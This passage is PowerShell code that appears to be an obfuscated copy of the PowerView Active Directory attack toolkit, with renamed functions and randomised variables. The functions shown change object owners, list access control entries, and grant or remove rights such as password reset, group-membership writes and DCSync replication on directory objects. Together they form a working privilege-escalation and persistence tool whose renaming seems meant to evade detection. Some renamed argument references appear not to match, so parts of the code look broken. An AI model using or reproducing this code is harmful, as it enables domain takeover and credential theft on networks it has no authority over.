                'Identity' = $tOdWYUfv99
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $axqedcxq99['Domain'] = $hYABGmiT99 }
            if ($PSBoundParameters['Server']) { $axqedcxq99['Server'] = $sWbqYnBA99 }
            if ($PSBoundParameters['SearchScope']) { $axqedcxq99['SearchScope'] = $hZznjEbB99 }
            if ($PSBoundParameters['ResultPageSize']) { $axqedcxq99['ResultPageSize'] = $jrZpVEwq99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $axqedcxq99['ServerTimeLimit'] = $kkbrymyp99 }
            if ($PSBoundParameters['Tombstone']) { $axqedcxq99['Tombstone'] = $YXMSPUCr99 }
            if ($PSBoundParameters['Credential']) { $axqedcxq99['Credential'] = $DegNROrc99 }
            $DVBOEKEu99 = structuring @PrincipalSearcherArguments
            if (-not $DVBOEKEu99) {
                throw "Unable to resolve principal: $tOdWYUfv99"
            }
            elseif($DVBOEKEu99.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $GTVZZPBV99 = $DVBOEKEu99.objectsid
        }
        else {
            $GTVZZPBV99 = $tOdWYUfv99
        }
        $JrPTWMxr99 = 0
        foreach($r in $Right) {
            $JrPTWMxr99 = $JrPTWMxr99 -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $JrPTWMxr99 = [System.DirectoryServices.ActiveDirectoryRights]$JrPTWMxr99
        $FMEdvzGY99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$GTVZZPBV99)
    }
    Process {
        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {
            if($EvGISQEU99 -eq $null -and $ikuxOjdc99 -eq [String]::Empty -and $POxzXcvX99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $FMEdvzGY99, $JrPTWMxr99, $xmKgCvlF99
            } elseif($EvGISQEU99 -eq $null -and $ikuxOjdc99 -ne [String]::Empty -and $POxzXcvX99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $FMEdvzGY99, $JrPTWMxr99, $xmKgCvlF99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ikuxOjdc99)
            } elseif($EvGISQEU99 -eq $null -and $ikuxOjdc99 -ne [String]::Empty -and $POxzXcvX99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $FMEdvzGY99, $JrPTWMxr99, $xmKgCvlF99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ikuxOjdc99), $POxzXcvX99
            } elseif($EvGISQEU99 -ne $null -and $ikuxOjdc99 -eq [String]::Empty -and $POxzXcvX99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $FMEdvzGY99, $JrPTWMxr99, $xmKgCvlF99, $EvGISQEU99
            } elseif($EvGISQEU99 -ne $null -and $ikuxOjdc99 -ne [String]::Empty -and $POxzXcvX99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $FMEdvzGY99, $JrPTWMxr99, $xmKgCvlF99, $EvGISQEU99, $ikuxOjdc99
            } elseif($EvGISQEU99 -ne $null -and $ikuxOjdc99 -ne [String]::Empty -and $POxzXcvX99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $FMEdvzGY99, $JrPTWMxr99, $xmKgCvlF99, $EvGISQEU99, $ikuxOjdc99, $POxzXcvX99
            }
        }
        else {
            if($EvGISQEU99 -eq $null -and $ikuxOjdc99 -eq [String]::Empty -and $POxzXcvX99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $FMEdvzGY99, $JrPTWMxr99, $HhNKRiYA99
            } elseif($EvGISQEU99 -eq $null -and $ikuxOjdc99 -ne [String]::Empty -and $POxzXcvX99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $FMEdvzGY99, $JrPTWMxr99, $HhNKRiYA99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ikuxOjdc99)
            } elseif($EvGISQEU99 -eq $null -and $ikuxOjdc99 -ne [String]::Empty -and $POxzXcvX99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $FMEdvzGY99, $JrPTWMxr99, $HhNKRiYA99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ikuxOjdc99), $POxzXcvX99
            } elseif($EvGISQEU99 -ne $null -and $ikuxOjdc99 -eq [String]::Empty -and $POxzXcvX99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $FMEdvzGY99, $JrPTWMxr99, $HhNKRiYA99, $EvGISQEU99
            } elseif($EvGISQEU99 -ne $null -and $ikuxOjdc99 -ne [String]::Empty -and $POxzXcvX99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $FMEdvzGY99, $JrPTWMxr99, $HhNKRiYA99, $EvGISQEU99, $ikuxOjdc99
            } elseif($EvGISQEU99 -ne $null -and $ikuxOjdc99 -ne [String]::Empty -and $POxzXcvX99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $FMEdvzGY99, $JrPTWMxr99, $HhNKRiYA99, $EvGISQEU99, $ikuxOjdc99, $POxzXcvX99
            }
        }
    }
}
function procreation {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $FMEdvzGY99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $ohNMHkCK99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $cODXoeui99 = @{}
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['LDAPFilter']) { $cODXoeui99['LDAPFilter'] = $YcLdsqIq99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        $OeGcXtEO99 = structuring @SearcherArguments -FMEdvzGY99 $ohNMHkCK99 -pwEfoKvn99 objectsid | Select-Object -ExpandProperty objectsid
        if ($OeGcXtEO99) {
            $aMIoqAZF99 = [System.Security.Principal.SecurityIdentifier]$OeGcXtEO99
        }
        else {
            Write-Warning "[procreation] Error parsing owner identity '$ohNMHkCK99'"
        }
    }
    PROCESS {
        if ($aMIoqAZF99) {
            $cODXoeui99['Raw'] = $True
            $cODXoeui99['Identity'] = $FMEdvzGY99
            $SwhVpDDy99 = structuring @SearcherArguments
            ForEach ($Object in $SwhVpDDy99) {
                try {
                    Write-Verbose "[procreation] Attempting to set the owner for '$FMEdvzGY99' to '$ohNMHkCK99'"
                    $Entry = $SwhVpDDy99.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                    $Entry.PsBase.ObjectSecurity.SetOwner($aMIoqAZF99)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[procreation] Error setting owner: $_"
                }
            }
        }
    }
}
function capsized {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $FMEdvzGY99,
        [Switch]
        $Sacl,
        [Switch]
        $CiOurgss99,
        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $TUycNjQz99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $cODXoeui99 = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }
        if ($PSBoundParameters['Sacl']) {
            $cODXoeui99['SecurityMasks'] = 'Sacl'
        }
        else {
            $cODXoeui99['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        $MWKeDdKg99 = Zimbabweans @SearcherArguments
        $GvyKExox99 = @{}
        if ($PSBoundParameters['Domain']) { $GvyKExox99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Server']) { $GvyKExox99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['ResultPageSize']) { $GvyKExox99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $GvyKExox99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Credential']) { $GvyKExox99['Credential'] = $DegNROrc99 }
        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = puberty @DomainGUIDMapArguments
        }
    }
    PROCESS {
        if ($MWKeDdKg99) {
            $gkqsWVjp99 = ''
            $ypcTqVPU99 = ''
            $FMEdvzGY99 | Where-Object {$_} | ForEach-Object {
                $nwpngcEV99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($nwpngcEV99 -match '^S-1-.*') {
                    $gkqsWVjp99 += "(objectsid=$nwpngcEV99)"
                }
                elseif ($nwpngcEV99 -match '^(CN|OU|DC)=.*') {
                    $gkqsWVjp99 += "(distinguishedname=$nwpngcEV99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $WbECQjVp99 = $nwpngcEV99.SubString($nwpngcEV99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[capsized] Extracted domain '$WbECQjVp99' from '$nwpngcEV99'"
                        $cODXoeui99['Domain'] = $WbECQjVp99
                        $MWKeDdKg99 = Zimbabweans @SearcherArguments
                        if (-not $MWKeDdKg99) {
                            Write-Warning "[capsized] Unable to retrieve domain searcher for '$WbECQjVp99'"
                        }
                    }
                }
                elseif ($nwpngcEV99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $wqHaFAge99 = (([Guid]$nwpngcEV99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $gkqsWVjp99 += "(objectguid=$wqHaFAge99)"
                }
                elseif ($nwpngcEV99.Contains('.')) {
                    $gkqsWVjp99 += "(|(samAccountName=$nwpngcEV99)(name=$nwpngcEV99)(dnshostname=$nwpngcEV99))"
                }
                else {
                    $gkqsWVjp99 += "(|(samAccountName=$nwpngcEV99)(name=$nwpngcEV99)(displayname=$nwpngcEV99))"
                }
            }
            if ($gkqsWVjp99 -and ($gkqsWVjp99.Trim() -ne '') ) {
                $ypcTqVPU99 += "(|$gkqsWVjp99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[capsized] Using additional LDAP filter: $YcLdsqIq99"
                $ypcTqVPU99 += "$YcLdsqIq99"
            }
            if ($ypcTqVPU99) {
                $MWKeDdKg99.filter = "(&$ypcTqVPU99)"
            }
            Write-Verbose "[capsized] capsized filter string: $($MWKeDdKg99.filter)"
            $oboKDFwv99 = $MWKeDdKg99.FindAll()
            $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties
                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $GTVZZPBV99 = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $GTVZZPBV99 = $Null
                }
                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $chyfLaok99 = Switch ($TUycNjQz99) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $chyfLaok99) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $GTVZZPBV99
                                $HvUQKiPD99 = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $GTVZZPBV99
                            $HvUQKiPD99 = $True
                        }
                        if ($HvUQKiPD99) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                $iEErJCiG99 = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $iEErJCiG99[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $iEErJCiG99[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $iEErJCiG99[$_.Name] = $_.Value
                                    }
                                }
                                $gncLdwls99 = New-Object -TypeName PSObject -Property $iEErJCiG99
                                $gncLdwls99.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $gncLdwls99
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[capsized] Error: $_"
                }
            }
        }
    }
}
function artless {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $jpaQfnnt99,
        [ValidateNotNullOrEmpty()]
        [String]
        $hfELBeHx99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $zxLdGvXA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $iwoisqAH99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tOdWYUfv99,
        [ValidateNotNullOrEmpty()]
        [String]
        $hYABGmiT99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $UGOJfkGK99 = 'All',
        [Guid]
        $JEWiSwZg99
    )
    BEGIN {
        $vJYGEvcb99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $vJYGEvcb99['Domain'] = $hfELBeHx99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $vJYGEvcb99['LDAPFilter'] = $zxLdGvXA99 }
        if ($PSBoundParameters['TargetSearchBase']) { $vJYGEvcb99['SearchBase'] = $iwoisqAH99 }
        if ($PSBoundParameters['Server']) { $vJYGEvcb99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $vJYGEvcb99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $vJYGEvcb99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $vJYGEvcb99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $vJYGEvcb99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $vJYGEvcb99['Credential'] = $DegNROrc99 }
        $axqedcxq99 = @{
            'Identity' = $tOdWYUfv99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $axqedcxq99['Domain'] = $hYABGmiT99 }
        if ($PSBoundParameters['Server']) { $axqedcxq99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $axqedcxq99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $axqedcxq99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $axqedcxq99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $axqedcxq99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $axqedcxq99['Credential'] = $DegNROrc99 }
        $hxyMwZLH99 = structuring @PrincipalSearcherArguments
        if (-not $hxyMwZLH99) {
            throw "Unable to resolve principal: $tOdWYUfv99"
        }
    }
    PROCESS {
        $vJYGEvcb99['Identity'] = $jpaQfnnt99
        $FaiqPCCn99 = structuring @TargetSearcherArguments
        ForEach ($yNuhZIow99 in $FaiqPCCn99) {
            $ikuxOjdc99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $ZkGWUShP99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()
            if ($JEWiSwZg99) {
                $GUIDs = @($JEWiSwZg99)
            }
            else {
                $GUIDs = Switch ($UGOJfkGK99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }
            ForEach ($EJnzuJRR99 in $hxyMwZLH99) {
                Write-Verbose "[artless] Granting principal $($EJnzuJRR99.distinguishedname) '$UGOJfkGK99' on $($yNuhZIow99.Properties.distinguishedname)"
                try {
                    $FMEdvzGY99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$EJnzuJRR99.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $WPGtNqKz99 = New-Object Guid $GUID
                            $DSRICrcQ99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $FMEdvzGY99, $DSRICrcQ99, $ZkGWUShP99, $WPGtNqKz99, $ikuxOjdc99
                        }
                    }
                    else {
                        $DSRICrcQ99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $FMEdvzGY99, $DSRICrcQ99, $ZkGWUShP99, $ikuxOjdc99
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[artless] Granting principal $($EJnzuJRR99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($yNuhZIow99.Properties.distinguishedname)"
                        $uIxqPNFH99 = $yNuhZIow99.GetDirectoryEntry()
                        $uIxqPNFH99.PsBase.Options.SecurityMasks = 'Dacl'
                        $uIxqPNFH99.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $uIxqPNFH99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[artless] Error granting principal $($EJnzuJRR99.distinguishedname) '$UGOJfkGK99' on $($yNuhZIow99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function shapelessly {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $jpaQfnnt99,
        [ValidateNotNullOrEmpty()]
        [String]
        $hfELBeHx99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $zxLdGvXA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $iwoisqAH99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tOdWYUfv99,
        [ValidateNotNullOrEmpty()]
        [String]
        $hYABGmiT99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $UGOJfkGK99 = 'All',
        [Guid]
        $JEWiSwZg99
    )
    BEGIN {
        $vJYGEvcb99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $vJYGEvcb99['Domain'] = $hfELBeHx99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $vJYGEvcb99['LDAPFilter'] = $zxLdGvXA99 }
        if ($PSBoundParameters['TargetSearchBase']) { $vJYGEvcb99['SearchBase'] = $iwoisqAH99 }
        if ($PSBoundParameters['Server']) { $vJYGEvcb99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $vJYGEvcb99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $vJYGEvcb99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $vJYGEvcb99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $vJYGEvcb99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $vJYGEvcb99['Credential'] = $DegNROrc99 }
        $axqedcxq99 = @{
            'Identity' = $tOdWYUfv99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $axqedcxq99['Domain'] = $hYABGmiT99 }
        if ($PSBoundParameters['Server']) { $axqedcxq99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $axqedcxq99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $axqedcxq99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $axqedcxq99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $axqedcxq99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $axqedcxq99['Credential'] = $DegNROrc99 }
        $hxyMwZLH99 = structuring @PrincipalSearcherArguments
        if (-not $hxyMwZLH99) {
            throw "Unable to resolve principal: $tOdWYUfv99"
        }
    }
    PROCESS {
        $vJYGEvcb99['Identity'] = $jpaQfnnt99
        $FaiqPCCn99 = structuring @TargetSearcherArguments
        ForEach ($yNuhZIow99 in $FaiqPCCn99) {
            $ikuxOjdc99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $ZkGWUShP99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()
            if ($JEWiSwZg99) {
                $GUIDs = @($JEWiSwZg99)
            }
            else {
                $GUIDs = Switch ($UGOJfkGK99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }
            ForEach ($EJnzuJRR99 in $hxyMwZLH99) {
                Write-Verbose "[shapelessly] Removing principal $($EJnzuJRR99.distinguishedname) '$UGOJfkGK99' from $($yNuhZIow99.Properties.distinguishedname)"
                try {
                    $FMEdvzGY99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$EJnzuJRR99.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $WPGtNqKz99 = New-Object Guid $GUID
                            $DSRICrcQ99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $FMEdvzGY99, $DSRICrcQ99, $ZkGWUShP99, $WPGtNqKz99, $ikuxOjdc99
                        }
                    }
                    else {
                        $DSRICrcQ99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $FMEdvzGY99, $DSRICrcQ99, $ZkGWUShP99, $ikuxOjdc99
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[shapelessly] Granting principal $($EJnzuJRR99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($yNuhZIow99.Properties.distinguishedname)"
                        $uIxqPNFH99 = $yNuhZIow99.GetDirectoryEntry()
                        $uIxqPNFH99.PsBase.Options.SecurityMasks = 'Dacl'
                        $uIxqPNFH99.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $uIxqPNFH99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[shapelessly] Error removing principal $($EJnzuJRR99.distinguishedname) '$UGOJfkGK99' from $($yNuhZIow99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function remounted {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $StsWGohF99,
        [Switch]
        $CiOurgss99,
        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $TUycNjQz99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
